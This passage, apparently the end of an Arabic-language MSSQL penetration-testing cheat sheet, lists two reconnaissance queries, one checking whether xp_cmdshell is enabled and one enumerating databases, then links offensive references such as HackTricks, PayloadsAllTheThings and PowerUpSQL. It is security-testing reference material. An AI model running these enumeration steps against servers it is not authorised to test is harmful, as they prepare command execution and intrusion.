| `SELECT * FROM sys.configurations WHERE name='xp_cmdshell';` | حالة xp_cmdshell |
| `SELECT name FROM sys.databases;` | كل databases |

---

## 📚 المصادر

- [HackTricks - MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- [PayloadsAllTheThings - MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
- [PowerUpSQL GitHub](https://github.com/NetSPI/PowerUpSQL)
- [Impacket Documentation](https://github.com/fortra/impacket)